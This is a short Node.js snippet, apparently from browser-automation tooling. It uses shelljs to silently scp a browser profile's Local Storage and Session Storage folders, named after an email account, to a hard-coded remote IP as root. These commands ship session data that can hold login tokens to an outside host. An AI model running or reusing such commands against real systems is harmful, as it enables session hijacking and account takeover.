const shell = require('shelljs');

shell.exec('scp -r /root/puppet/puppet/tidalnawof36088@iistoria.com/Local Storage root@216.158.239.199:/root/puppet/', { async: !check, silent: true })
shell.exec('scp -r /root/puppet/puppet/tidalnawof36088@iistoria.com/Session Storage root@216.158.239.199:/root/puppet/', { async: !check, silent: true })